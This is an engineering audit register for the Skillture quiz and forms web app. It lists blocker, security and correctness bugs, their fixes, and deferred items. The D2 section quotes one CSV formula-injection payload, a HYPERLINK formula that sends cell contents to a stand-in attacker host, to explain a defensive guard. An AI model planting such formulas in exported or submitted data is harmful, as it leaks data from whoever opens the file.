# Skillture — Issue Register

Every defect found in the August 2026 audit of the backend, frontend and infrastructure.
Nothing found has been dropped: items not fixed in that pass are listed as **deferred**
with a reason.

Severity: **Blocker** — the documented setup or a headline feature does not work at all ·
**Security** · **High** — wrong behaviour users will hit · **Medium** — wrong behaviour
under load or at an edge · **Low** — hygiene.

Summary: **53 items — 43 fixed, 10 deferred.** D12 (frontend structural debt) was
cleared in a follow-up pass, along with D13 and D14, which that pass had carved
out of it; see below.

---

## Fixed

### Blockers

| ID | Where | Symptom | Fix |
|---|---|---|---|
| B1 | `backend/internal/database/schema.sql:53` | Line 53 was `// UNIQUE INDEX REMOVED …`. `//` is not a SQL comment. The Postgres entrypoint runs init scripts with `ON_ERROR_STOP=1`, so init aborted there and **9 of 13 tables were never created**. The documented one-command setup could not work. | Changed to `--`. |
| B2 | `frontend/src/pages/PlayerLiveBoard.tsx` | The answer POST omitted `player_id` and `question_id`, both `binding:"required"` on the handler. **Every answer returned 400** — no player could ever score. | Both fields are now sent. |
| B3 | `backend/internal/server/routes.go` | `PublishResults` existed but its route was never registered, so `POST /sessions/:id/show_results` 404'd. The "Show Leaderboard" button and the auto-advance both failed silently. | Route registered. |
| B4 | `frontend/src/pages/Dashboard.tsx` | The AI panel posted to `/api/v1/ai/generate`, which does not exist; the real route is `GET /api/v1/admin/ai-report` and takes no prompt. | Panel rewritten as a "Generate report" button hitting the real endpoint. |
| B5 | `quiz_session_handler.go` `FinishSession` | Never broadcast `game_finished`, which `PlayerLiveBoard` waits for. Players hung on the leaderboard forever. | Broadcasts `game_finished` with the final leaderboard. |
| B6 | `frontend/src/pages/HostLiveBoard.tsx` | Local `Question` type used `title`/`order_index`; the API sends `question`/`position`. `currentQ.title.en` threw a TypeError and **blanked the host screen on the first question**. | Type corrected to match `entities.QuizQuestion`. |
| B7 | `backend/Dockerfile` | Bare `alpine:latest` with no `ca-certificates`: every Gemini call failed with `x509: certificate signed by unknown authority`. `WORKDIR /root/` while compose mounted the volume at `/app/uploads`, so **uploaded images were written to the container layer and lost on rebuild**. Ran as root. | Added `ca-certificates` + `tzdata`, `WORKDIR /app`, non-root `USER`, `-trimpath -ldflags="-s -w"`. |
| B8 | `HomePage.tsx`, `HomepageEditor.tsx` | Image URLs were built from `import.meta.env.VITE_API_URL`, which is defined nowhere — no `.env`, no compose build arg. Vite inlined it as `undefined`, producing `src="undefined/uploads/…"`. **Every hero image 404'd in every deployment.** | Dropped; `file_path` is already root-relative and nginx proxies `/uploads/`. |
| B9 | `.github/workflows/` | `actions/login-action@v3`, `actions/build-push-action@v5`, `actions/setup-buildx-action@v3` are not real actions (they are `docker/*`), so the delivery job **had never once succeeded**. Go pinned to 1.22 against a `go 1.25.4` module. Build ran at the repo root after the code moved to `backend/`. Tests commented out. `go fmt ./...` used as a gate, which rewrites files and always exits 0. `deploy.yml` duplicated the job and `cd backend` failed on a clean checkout. | Rewritten: correct `docker/*` actions, `go-version-file`, `working-directory`, tests + vet + `gofmt -l` gate, frontend lint/typecheck/build job, matrix image push tagged with the commit SHA, GHA layer cache, `packages: write`. `deploy.yml` deleted. |
| B10 | `schema.sql:284` | The seeded bcrypt hash matched **none** of the three documented passwords (verified against `Skillture@2025`, `admin123`, `admin`). The seeded account was unusable; login only worked because `main.go` recreated `admin`/`admin` on every boot. | Replaced with a real bcrypt hash of the documented password. |
| B11 | repo root | The Go tree had been moved into `backend/` with a plain `mv`: 92 deletions unstaged and all of `backend/` untracked, along with `docker-compose.yml`, `README.md`, `nginx.conf` and 11 frontend source files. **A fresh clone could not build or run.** | Committed as one restructure commit. |

### Security

| ID | Where | Symptom | Fix |
|---|---|---|---|
| S1 | `admin_handler.go`, `middleware.go`, `routes.go` | `POST /admin/login` returned the literal string `"dummy-token-123"`. `setupMiddleware` was unexported and never called. No middleware verified anything. **Every route was open to anonymous callers**, including `POST /admin/create` and `DELETE /admin/delete/:id`. The SPA's `MainLayout` guard was cosmetic. | Real HS256 JWT (`internal/auth/auth.go`) with pinned algorithm, issuer and expiry checks; `RequireAdmin` applied to all admin routes; public routes explicitly enumerated. |
| S2 | `cmd/api/main.go:56-59` | Created `admin`/`admin`, `hussein`/`hussein` and the typo'd `husssein`/`hussein` **on every process start**, discarding errors. A backdoor that reappeared after any manual cleanup. | Deleted. The initial account comes from the schema seed, which only fires when `admins` is empty. |
| S3 | `admin_usecase.go:179` | On a failed login, logged the stored bcrypt hash **and** a fresh hash of the attempted password. Password material in the application log. | Logs only the username. |
| S4 | `quiz_session_handler.go` | `AdvanceQuestion` broadcast the full `QuizQuestion`, whose `correct_answer` has no `json:"-"`. **The answer was sent to every player before they answered.** | Added `entities.PublicQuizQuestion` + `PublicView()`; the broadcast uses it. |
| S5 | `quiz_ws_handler.go`, `quiz_answer_usecase.go` | `player_id` came from a query parameter/body and was only checked for existence. Any UUID let a caller impersonate another player or score into a different session. | Both paths verify `player.SessionID == sessionID`; new `ErrPlayerNotInSession` → 403. |
| S6 | `middleware.go`, `quiz_ws_handler.go` | Hardcoded `Access-Control-Allow-Origin: *` alongside an allowed `Authorization` header, and `CheckOrigin: func(*http.Request) bool { return true }` on the WebSocket upgrader. | Both driven from `CORS_ALLOWED_ORIGINS`; the origin is echoed, never wildcarded alongside credentials. |
| S7 | `homepage_handler.go` | Image upload had no auth, no size limit, no type check. `filepath.Ext` came from the client filename and `uploads/` is served statically — an `.svg` or `.html` upload was **stored XSS**. The original filename was stored as `alt_text` and echoed back. | Auth required; size limit and extension allow-list from `cfg.Upload`; content sniffed with `http.DetectContentType`; stored name is a fresh UUID; `alt_text` sanitised. |
| S8 | `backend/.env.example` | Documented 7 of 30 keys and omitted `JWT_SECRET`, which `config.go` requires to be ≥32 chars — so **following the README produced a backend that refused to start**. Six keys in the real `.env` (`DB_CONNECTION_TIMEOUT`, `READ_TIMEOUT`, …) did not match the names `config.go` reads and were silently ignored. | Rewritten with all keys, correct names, and inline notes on the mandatory ones. |
| S9 | `config.go`, `db.go` | Credential defaults from an unrelated project: `DB_USER=cpper`, `DB_PASSWORD=0770`, `DB_NAME=nahjdbv`, `JWT_ISSUER=nahj-api`, `application_name=nahj-api`. | Credential defaults removed (`Validate()` already requires them); issuer is now `skillture-api`. |
| S10 | `docker-compose.yml` | `POSTGRES_USER: hussein` / `POSTGRES_PASSWORD: hussein` hardcoded in a committed file. | Read from the gitignored `backend/.env` via `env_file`. |
| S11 | `schema.sql`, `README.md`, `main.go` | Three different documented admin passwords (`Skillture@2025`, `admin123`, `admin`), with the plaintext sitting in a comment beside the hash. | One documented credential, README and schema agree, with an explicit "change immediately" warning. |
| S12 | `admin_usecase.go` | `HashPassword` returned `""` on error and `Create` stored the empty string as the password hash. bcrypt cost hardcoded to 12, ignoring `cfg.JWT.BcryptCost`. | Returns an error that aborts the create; cost comes from config with a range check. |
| S13 | `admin_repository_test.go`, `base_repository_test.go` | Hardcoded `localhost:5432` with a personal username and password, no skip guard — `go test ./...` failed on every machine without that exact database, which is why CI had tests commented out. | Shared `testPool(t)` helper reading `TEST_DATABASE_URL`; skips when unset. |

### Correctness

| ID | Where | Symptom | Fix |
|---|---|---|---|
| C1 | `form_field_usecase.go` | `GetByID` returns `(nil, nil)` for a missing row; `existing.FormID` then **panicked** on any unknown field ID. | Nil checks on all four call sites. |
| C2 | `repository/postgres/*` | Two incompatible not-found conventions: six repositories returned `(nil, nil)`, four wrapped `pgx.ErrNoRows` in a generic error that surfaced as 500. Root cause of C1. | All `GetByID` methods return `(nil, nil)`; callers nil-check and return `ErrNotFound`. |
| C3 | `base_repository.go` | `Query` called `defer cancel()`, cancelling the timeout context **before the caller iterated the rows** — combined with C4, list endpoints could silently return fewer rows than exist. `QueryRow` discarded its `CancelFunc` entirely, leaking a timer per call on the hottest path. | `Query` returns rows that release the context on `Close`; `QueryRow` releases it on `Scan`. |
| C4 | all 11 repository `List` methods | `rows.Err()` was checked in **zero** places. A failure part-way through iteration returned a truncated slice as a successful result. | Checked everywhere. |
| C5 | `form_repository.go` | `title ILIKE $n` against a JSONB column fails with `operator does not exist: jsonb ~~* unknown`. Any title-filtered list was a guaranteed 500. | `title->>'en' ILIKE … OR title->>'ar' ILIKE …`, with the filter builder rewritten so placeholder numbering is correct. |
| C6 | `quiz_answer_usecase.go`, `quiz_player_repository.go` | Score was computed in Go and written with `SET score = $2`. Two concurrent answers both read the same starting total and the second overwrote the first — **silently lost points**. | Replaced `UpdateScore` with `AddScore`, doing `SET score = score + $2 RETURNING score`. |
| C7 | `quiz_answer_usecase.go` | `time_taken_ms` is measured in the browser and was used unclamped. `-999999` gave a speed ratio above 1 and **a score above the question's base points** — a one-line cheat. | `clampTimeTaken` bounds it to `[0, timeLimit]`. Covered by tests. |
| C8 | `ws/hub.go` | Two races. (a) `Hub.Run` closed `client.send` while a caller holding a raw `*Client` could still be writing — `panic: send on closed channel`. (b) `RegisterClient` queued registration on a channel and returned, so the handler's immediately-following `player_joined` broadcast found no room and **was silently dropped** — the classic "players don't appear in the lobby" bug. | Registration is synchronous; close is guarded by `sync.Once` plus a `closed` channel; empty-room deletion re-checks under the write lock. |
| C9 | `quiz_session_handler.go` | `_ = c.ShouldBindJSON(&req)` then `hostID = uuid.Nil`, but `quiz_sessions.host_id` is a `NOT NULL` FK to `admins(id)` — an opaque foreign-key violation reported as 400 whenever the body was omitted. | Host is taken from the authenticated token. |
| C10 | `frontend/src/api/types.ts` | `Form.status` and `Quiz.status` were typed as string unions while the API sends `int16`. The dashboard's "Active Quizzes" and "Published Forms" cards **read 0 permanently**. `FormField.is_required` should be `required`; `QuizSession.state` should be `status`. Call sites papered over it with `form.status as any as 0\|1\|2`. | `types.ts` rewritten to mirror the Go entities; `"strict": true` enabled so the next mismatch fails the build. |
| C11 | `FormPreview.tsx` | Field types were compared against `'textarea'`/`'select'`/`'radio'`/`'checkbox'` while `enums.FieldType` is `int16` 1–8, so **every field rendered as a plain text input**. `field.is_required` (wrong key) was always `undefined`, so required-field validation never ran. Option labels were read as `en`/`value` while the builder writes `label`, so users saw `opt_0`, `opt_1`. | All three corrected. |
| C12 | `api/client.ts` | No response interceptor: an expired token left the SPA rendering as "logged in" while every request failed. | 401 clears storage and redirects to `/login`. |
| C13 | `README.md` | Port 5173 (compose publishes 5175), Go 1.22 (module needs 1.25.4), "Gemini 3.1 Pro" (no such model; the code calls `gemini-2.5-flash`), admin password `admin123` (wrong). | Rewritten, plus setup prerequisites, checks, and a `down -v` note for schema changes. |
| C14 | `FormBuilder.tsx` | `setTitle(fRes.data.title)` where `title` is a JSONB map, so the edit form's inputs showed `[object Object]`. `FormQuizBuilder` did the same thing correctly with `?.en`. | Reads `?.en`. |
| C15 | `form_handler.go` | `Update` unconditionally overwrote `Title` and `Description`, so a PUT omitting `description` **wiped it** — despite the handler doing a read-modify-write that implies partial updates. | Only fields present in the request are applied. |
| C16 | `quiz_player_usecase.go` | Every `Create` error was rewritten to `ErrDuplicatePlayerName`, so a database outage was reported to the player as "that nickname is taken" (409). | Only SQLSTATE `23505` maps to the duplicate error. |
| C17 | `quiz_answer_usecase.go` | The double-answer guard was check-then-insert with no transaction; two concurrent submissions both passed and the `uq_player_question_answer` violation surfaced as a 500. | Unique violation is caught and mapped to `ErrAlreadyAnswered` (409). |
| C18 | `geminiService.go` | Four `QueryRow(...).Scan(...)` return values discarded — a missing table or failed query left the counters at zero and **the model was fed fabricated statistics presented to the admin as fact**. `resp.Candidates[0].Content.Parts` dereferenced `Content` without a nil check, so a safety-blocked or `MAX_TOKENS` candidate panicked. | Errors returned; candidates iterated with nil checks. |
| C19 | `geminiService.go`, `config.go` | `GEMINI_API_KEY` read with `os.Getenv` from inside the service, bypassing the config package. Model name hardcoded. | New `config.GeminiConfig` with `GEMINI_API_KEY` and `GEMINI_MODEL`. |
| C20 | `homepage_handler.go` | `GetImages` swallowed row-scan errors with `if err := …; err == nil`, so bad rows vanished from the response with no signal. Returned `null` instead of `[]` when empty. | Errors returned; empty result is `[]`. |
| C21 | `GameLobby.tsx`, `HostLiveBoard.tsx`, `PlayerLiveBoard.tsx` | Leaderboard rows were read as `player_id`/`player_name`; `entities.QuizPlayer` sends `id`/`name`. **Every leaderboard rendered blank names.** | Corrected in all three. |
| C22 | `ws/hub.go`, `quiz_ws_handler.go` | `Room.PlayerNames()` was documented as returning nicknames but returned UUID strings — `Client` had no name field — and was never called. `player_joined` carried only `player_id`, so the host displayed every joiner as "New Player". | `Client` carries `playerName`; the join broadcast and the lobby snapshot both include names. |
| C23 | `HostLiveBoard.tsx` | Players were only ever added from `player_joined`, so anyone who joined before the board mounted was invisible and `players.length` stayed 0 — which also disabled the "everyone answered" auto-advance. A stale-closure `showLeaderboard` could double-fire. | Roster seeded from the leaderboard on mount; `showLeaderboard` is a `useCallback` with a ref-based re-entrancy guard. |
| C24 | `StatusDropdown.tsx` | State was seeded once from `initialStatus` and never re-synced, so the badge disagreed with the server after a refetch. Form status 2 was labelled "Archived", which is not a form state. | `useEffect` re-sync; per-entity label maps. |
| C25 | `FormPreview.tsx` | Rendered and accepted submissions for draft and closed forms; the backend rejected them only after the respondent had filled the form in. | Banner shown and submit disabled unless the form is published. |
| C26 | `base_repository.go` | `WithTx` used an unchecked type assertion that panicked if the executor did not support `Begin`, scoped the whole transaction to the single-statement query timeout, and rolled back on that same expired context with the error discarded. | Checked assertion, unscoped transaction context, rollback on `context.WithoutCancel`. |
| C27 | `nginx.conf` / `vite.config.ts` | Four files each hardcoded `ws://localhost:8080` behind an `import.meta.env.DEV` check, bypassing the Vite `/ws` proxy that existed for exactly this purpose. | Single `src/api/ws.ts` helper; the dev proxy is now actually used. |

### Hygiene

| ID | Where | Fix |
|---|---|---|
| H1 | Build context | No `.dockerignore` anywhere: `COPY . .` shipped 238 MB of `frontend/node_modules` and two ~44 MB Go binaries into the build context on every build. Added for both images. |
| H2 | `.gitignore` | Root pattern was `" vendor/"` — a leading space meant it never matched. No `node_modules`, no `dist`, and `backend/tmp_build` (43 MB) matched no rule at all, so `git add backend/` would have committed it. Binary rules were unanchored (`main` matched any path). All fixed. |
| H3 | repo root | Untracked 36 MB `api` binary removed from tracking; `get-docker.sh` (an unreferenced copy of the upstream Docker installer) deleted. |
| H4 | `gofmt` | 23 files failed `gofmt -l`, invisible because CI ran `go fmt` (which rewrites and exits 0). All formatted; CI now gates on `gofmt -l`. |
| H5 | `docker-compose.yml` | `restart: always` → `unless-stopped`; backend healthcheck added; `frontend.depends_on` now waits on `service_healthy` rather than mere container existence; `env_file` marked `required: true`. |
| H6 | `frontend/Dockerfile` | `npm install` → `npm ci` (the image could drift from the lockfile CI used); `as` → `AS`; pinned `nginx:1.27-alpine`. |
| H7 | `config.go` | Package doc still said "for the Nahj application". Corrected. |
| H8 | Tests | Added table tests for `clampTimeTaken`, `calculateScore` and `checkAnswer`, including a property test that no client-supplied `time_taken_ms` can exceed base points. |

### D12 — frontend structural debt

Deferred out of the original pass, cleared in a follow-up. What it covered, and
where each part landed:

| Was | Now |
|---|---|
| No shared primitives; the same 6-line inline-style hover pattern repeated dozens of times, the spinner div at least 6 times | `components/ui/` — Button, IconButton, Input/Textarea/Select/Label, Card, Modal, Spinner, EmptyState, PageHeader, ConfirmDialog. One `onMouseEnter` left in the tree, inside a comment. |
| `#0ABFBC` hardcoded ~90 times (153 counting rgba forms) | 0. Every colour is a token from the `@theme` block in `index.css`. The fixed answer-tile palette in `PlayerLiveBoard` is the one deliberate exception and says so. |
| `FormQuizBuilder.tsx` 522 lines, `ResponsesTable.tsx` 449, `FormBuilder.tsx` 433 | 295 / 389 / 262, with the per-item editors, the PDF template and the export logic extracted into their own modules. |
| Three hand-rolled share modals | One `ShareModal`; the five inline `window.location.origin` URLs are in `lib/links.ts`. |
| `generateId` copy-pasted three times | `lib/id.ts`, wrapping `crypto.randomUUID()`. |
| Blocking `confirm()`/`alert()` | `ConfirmDialog` and the Toast store. None left. |
| 1.65 MB unsplit JS bundle | Entry chunk 408 kB (gzip 125). `html2pdf` (936 kB) is a dynamic import fetched on first export click; `xlsx` (425 kB) was deleted outright — see D2. |
| Dead `src/App.css`, `src/assets/`, `index.html` titled "frontend", stock Vite `frontend/README.md` | Deleted, retitled, rewritten. |
| 12 oxlint warnings | 0 across 51 files. |
| ~50 `any` types | 22, nearly all on axios error objects and the untyped html2pdf worker. |

The pass also fixed defects found while moving the code — in-place state mutation
in the quiz option editor, uncontrolled inputs and unreachable required-field
validation in `FormPreview`, a PDF export that could leave its 1200px template
covering the app, lexical sorting of the "Submitted At" column, pagination
stranded past the end of a filtered list, a leaked object URL per image upload,
and a `?pin=` join flow that advanced past a PIN it had not yet validated. Each
is described in its commit message.

### D13 — half-written saves in both builders

Carved out of D12 because it needed a backend change, then fixed.

Both builders saved by firing one request per field/question plus one per
deletion, in a sequential loop with no transaction. A failure part-way through
left the form half-written — some items updated, some not, deletions already
applied — and the author got one error with no way to tell what had landed.

Two endpoints now replace the whole list in one transaction:

    PUT /api/v1/forms/:id/fields       {"fields": [...]}
    PUT /api/v1/quizzes/:id/questions  {"questions": [...]}

An item keeping its `id` is updated in place, one without an id is inserted,
and any existing item absent from the list is deleted. Ordering comes from the
array, so `field_order` / `position` cannot disagree with what the author sees.
Everything is validated before anything is written.

Deliberately an upsert rather than delete-and-recreate: `response_answers`
references `form_fields(id)` and `quiz_player_answers` references
`quiz_questions(id)`, so recreating rows on every save would take collected
answers and played games with them. An id that is unknown, or belongs to a
different parent, is treated as an insert rather than trusted into an UPDATE of
another row. The per-item routes remain for scripted use.

### D2 — vulnerable spreadsheet dependency

`xlsx@0.18.5` carried CVE-2023-30533 (prototype pollution) and a ReDoS advisory,
with **no fixed version published to npm** — upstream ships the fix only from
the SheetJS CDN. `npm audit` reported it as unfixable for as long as the
dependency existed.

It was a 425 kB spreadsheet engine used for exactly one thing: writing a single
flat sheet of strings. It is gone, replaced by `lib/csv.ts` — about 40 lines,
no dependency. CSV opens in Excel on double-click, and the PDF export already
covers the formatted-report case.

Two things the CSV writer does that the xlsx path did not:

- **A UTF-8 BOM.** Without it Excel decodes the file as the system ANSI
  codepage and every Arabic answer arrives as mojibake.
- **A formula-injection guard.** A cell beginning `=`, `+`, `-`, `@`, tab or CR
  is executed as a formula by Excel, LibreOffice and Google Sheets. These
  values are typed by strangers into a *public* form and opened by an admin, so
  a submitted answer of `=HYPERLINK("https://evil.test?"&A1,"Click")` ran on
  open. The old export had the same hole and nothing had flagged it.

Two further advisories surfaced during this work that were not in the register:

- **postcss** path traversal (GHSA-r28c-9q8g-f849) — patched by a version bump.
- **react-router** RSC-mode CSRF bypass (GHSA-qwww-vcr4-c8h2), affecting
  7.12.0–8.2.0. The app was on 7.18.1. The vulnerable path is not reachable
  here — it needs `RouterProvider` with a server-action pipeline, and this app
  uses only `BrowserRouter`, `Routes`, `Route`, `Navigate`, `Outlet` and the
  navigation hooks — but no patched 7.x exists. `react-router-dom` was
  discontinued at 7.18.2, so the fix meant migrating imports to `react-router`
  and taking 8.3.0. Covered by a new router smoke test (`src/App.test.tsx`),
  which asserts the public homepage, the login page, and that an anonymous
  visitor to an admin route is redirected.

`npm audit` now reports **0 vulnerabilities**.

### D14 — no frontend tests

Also carved out of D12, and the reason the refactor came first: the logic worth
testing is now in plain modules rather than buried in page components.

Vitest + jsdom + Testing Library, 67 tests across 8 files, wired into CI as its
own step before the build. Coverage is aimed at the code with a history of
defects rather than at a percentage: `lib/i18n` (the localised-field unpacking
behind most of the C-series bugs), `lib/apiError`, `lib/id`, `lib/exportResponses`
(that the PDF template is restored even when rendering throws), and the field
and question editors (control selection by `FieldType`, option-label reading,
controlled inputs, immutable option patching, the correct-answer mark being
cleared with its option).

Writing them surfaced one more defect: neither editor associated its `<label>`
elements with their inputs, so the visible text was decoration and every control
was unnamed to a screen reader. Both now use `htmlFor`.

The backend gained matching tests for the D13 use-case gate, and a
route-registration test — gin rejects conflicting path segments at registration
time, so a bad route takes the process down on boot rather than failing one
endpoint.

---

## Deferred

Real defects, deliberately out of scope for the remediation pass. Roughly in priority order.

| ID | Severity | Where | Issue | Why deferred |
|---|---|---|---|---|
| D1 | Security | `AuthStore.ts`, `client.ts` | The JWT lives in `localStorage`, readable by any XSS on the origin. An httpOnly, SameSite cookie plus a refresh-token flow is the correct design. | Needs a refresh-token endpoint, CSRF protection, and a coordinated frontend change. Meaningful only after D2. |
| D3 | High | `response_handler.go` | `Submit` always passes `nil` for vectors, so `response_answer_vector_repository.go` (152 lines), the `response_answer_vectors` table, its HNSW index and the model-name enum are **entirely unreachable**. The embedding dimension is also `vector(1536)` (an OpenAI size) while the project uses Gemini, whose models are 768/3072. | Semantic search is an unbuilt feature, not a regression. Needs a product decision before the dimension is fixed. |
| D4 | High | `form_usecase.go` | `Publish` and `Close` have no routes. The only way to publish a form is the untyped `status` field on `PUT /forms/:id`, which bypasses the state-machine rules those methods enforce. | Small, but it changes the public API surface. |
| D5 | Medium | `quiz_handler.go` | `Position int` is tagged `binding:"required"`, and Go's validator treats `0` as absent — so **position 0 is rejected** and positions must start at 1 by accident. `UpdateQuestion`/`DeleteQuestion` read `:qid` but ignore `:id`, so no check that the question belongs to that quiz. | Ownership check needs a repository method that does not exist yet. |
| D6 | Medium | `quiz_player_usecase.go` | Documented and typed as returning `ErrSessionNotInLobby`, but only rejects *finished* sessions — **players can join a game already in progress**, and the handler's 422 branch is unreachable. | Arguably intended behaviour (late joiners). Needs a product decision. |
| D7 | Medium | `ws/hub.go` | Rooms are in-process, so two backend replicas split players across hubs. `Client.Send` also drops messages when the 64-slot buffer fills, and there is no resync protocol, so a lagging player desyncs permanently. `Hub.Run` has no shutdown path and `main.go`'s `defer db.Close()` never runs because `log.Fatalf` calls `os.Exit`. | Horizontal scaling needs a Redis/NATS broker — a design change, not a fix. |
| D8 | Medium | `schema.sql` | `quiz_sessions.host_id → admins(id) ON DELETE CASCADE` means deleting an admin destroys every session they hosted, cascading to players and answers — all historical results. Should be `RESTRICT` or `SET NULL`. Also: all timestamps are `TIMESTAMP` not `TIMESTAMPTZ`; `updated_at` columns have defaults but no trigger so they never update; `idx_quiz_sessions_pin` duplicates the implicit unique index; no index on `response_answer_vectors.response_answer_id` or `quiz_sessions.host_id`; status columns have no `CHECK` constraints. | Needs a migration tool (D9); editing `schema.sql` alone only affects fresh volumes. |
| D9 | Medium | infra | There is no migration tooling. `schema.sql` runs once via `docker-entrypoint-initdb.d`, so every schema change requires `docker compose down -v` and total data loss. | Introducing golang-migrate or similar is its own piece of work. |
| D10 | Low | backend-wide | Dead code: ~300 unused lines in `database/db.go` (retry logic, `ExecTx`, `BatchExec`, `CopyFrom`, metrics, `Monitor`, plus multi-tenancy `BeforeAcquire` hooks setting `app.current_school_id` for a school concept that does not exist in this schema); `Hub.RoomExists`; `MsgTypeError`; `AdminHandler.Health` duplicating `HealthCheck`; `ResponseUsecase.Create` which only ever errors; the unused `repository/types.go` error set and its 19-line commented-out block; `validation/form_validation.go:ValidateFormDomain`; two empty placeholder files (`usecase/interfaces/admin_usecase.go`, `validation/admin_validation.go`). Also `CreateBulk` is an N-round-trip loop despite `CopyFrom` existing unused. | Pure deletion; large diff, zero behaviour change. Best done as its own commit. |
| D11 | Low | backend-wide | Misspelled filenames: `form_field_handker.go`, `response_answer_vector_repositry_interface.go`, `respons_answer_vector_modelname.go`, `form_uscase_interface.go`. Misspelled struct tag `entities.Form.creat_at` (both `db:` and `json:`), which the frontend mirrors deliberately. `Form.IsActive()` compares `Status == 1` with a magic number, and the schema comment says `1=active, 0=inactive` while the Go enum says `0=draft,1=published,2=closed` — three descriptions of one column. | Renaming the `creat_at` tag is a breaking API change needing a coordinated frontend release. |

### Not addressed by design

- **`.git` is 154 MB** for a few MB of source — a 36 MB `api` binary appears twice in
  history, along with committed `node_modules` and design mockups. Cleaning this needs
  `git filter-repo` and a force-push across four remote branches (`main`, `dev`, `stage`,
  `AIdev`), rewriting every commit hash. That is the repository owner's call, not a
  routine fix.
- **`caveman.md`** at the repo root is a tracked agent-prompt file unrelated to the
  product. Left in place — removing it is a preference, not a defect.

---

## Keeping this list honest

Two rules cover most of what went wrong here:

1. **`frontend/src/api/types.ts` must mirror the Go entities.** Nearly every user-visible
   bug in the correctness table came from those two drifting apart. `"strict": true` is now
   on, which turns the next mismatch into a build failure instead of a blank screen.
2. **Repositories signal "not found" as `(nil, nil)`.** Callers nil-check and return
   `domainErrors.ErrNotFound`; `handlers/errors.go` maps that to 404. Do not introduce a
   second convention.
